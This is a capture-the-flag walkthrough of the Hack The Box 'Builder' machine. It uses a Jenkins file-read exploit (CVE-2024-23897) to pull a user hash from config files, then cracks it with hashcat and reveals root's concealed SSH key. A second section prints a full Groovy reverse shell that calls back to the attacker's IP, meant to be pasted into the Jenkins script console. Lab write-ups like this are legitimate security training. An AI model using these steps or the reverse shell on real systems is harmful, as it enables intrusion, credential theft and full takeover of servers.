---
icon: ubuntu
---

# Builder - Medium

<figure><img src="../../.gitbook/assets/image (1735).png" alt="" width="75"><figcaption><p><a href="https://www.hackthebox.com/machines/builder"><strong>Builder</strong></a></p></figcaption></figure>

## Gaining Access

Nmap scan:

```
#Nmap TCP
nmap -A -T4 -p- -Pn 10.10.11.10 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-17 13:28 EDT
Nmap scan report for 10.10.11.10
Host is up (0.042s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
8080/tcp open  http    Jetty 10.0.18
|_http-title: Dashboard [Jenkins]
| http-robots.txt: 1 disallowed entry 
|_/
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-server-header: Jetty(10.0.18)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8888/tcp)
HOP RTT      ADDRESS
1   28.14 ms 10.10.16.1
2   57.20 ms 10.10.11.10
```

This box is running Jenkins, and we have no credentials or other ports open that could possible lead to some credentials. So we are going to use the Jenkins arbitrary file read exploit available at this GitHub [**repo**](https://github.com/godylockz/CVE-2024-23897)

### **Exploiting Jenkins arbitrary file read**

```
python3 jenkins_fileread.py  -u http://10.10.11.10:8080
```

<figure><img src="../../.gitbook/assets/image (1736).png" alt=""><figcaption></figcaption></figure>

I tried a couple of default locations to try and find the InitialAdminPassword, but had no success in finding it.

**Jenkins** [**stores information**](https://dev.to/pencillr/spawn-a-jenkins-from-code-gfa) **about its user accounts in `/var/jenkins_home/users/users.xml`**

<figure><img src="../../.gitbook/assets/image (1737).png" alt=""><figcaption></figcaption></figure>

We got a user, let's try to grab his hash&#x20;

```
/var/jenkins_home/users/jennifer_12108429903186576833/config.xml
```

<figure><img src="../../.gitbook/assets/image (1738).png" alt=""><figcaption></figcaption></figure>

### Cracking bcrypt hash

<figure><img src="../../.gitbook/assets/image (1739).png" alt=""><figcaption></figcaption></figure>

```
hashcat -m 3200 jennifer.hash /usr/share/wordlists/rockyou.txt
```

```
hashcat -m 3200 jennifer.hash /usr/share/wordlists/rockyou.txt --show
```

<figure><img src="../../.gitbook/assets/image (1740).png" alt=""><figcaption></figcaption></figure>

Now we can login to Jenkins as jennifer

<figure><img src="../../.gitbook/assets/image (1741).png" alt=""><figcaption></figcaption></figure>

### J**enkins Revealing concealed ssh keys**

I can grab root's ssh key. We need to get to this specific link and then click on the gear icon

<figure><img src="../../.gitbook/assets/image (1742).png" alt=""><figcaption></figcaption></figure>

You will see a concealed private key there, but we are actually able to reveal it in the inspector

<figure><img src="../../.gitbook/assets/image (1743).png" alt=""><figcaption></figcaption></figure>

I’m able to grab the base64 data from the hidden field and decrypt it very easily using the script console (from the main dashboard, go to “Manage Jenkins” -> Script Console):

<figure><img src="../../.gitbook/assets/image (1744).png" alt=""><figcaption></figcaption></figure>

Now we can use that ssh key to login as root

<figure><img src="../../.gitbook/assets/image (1745).png" alt=""><figcaption></figcaption></figure>

Awesome way to get root!

## Root another way

Now let's say this was not an option or we did not think about it. Let's get a shell on the system with a groovy rev shell

### Groovy Rev Shell

```
String host="10.10.16.3";
int port=9002;
String cmd="bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

Paste this in the script console and change your ip port or cmd base on the target machine's OS. Also make sure you have a listener ready on whatever port you choose

<figure><img src="../../.gitbook/assets/image (1746).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1747).png" alt=""><figcaption></figcaption></figure>

As soon as I ran linpeas, it revealed that same concealed secret to us. We can use the same technique as above to decrypt it. This means this was the intended way to get the box done

<figure><img src="../../.gitbook/assets/image (1748).png" alt=""><figcaption></figcaption></figure>
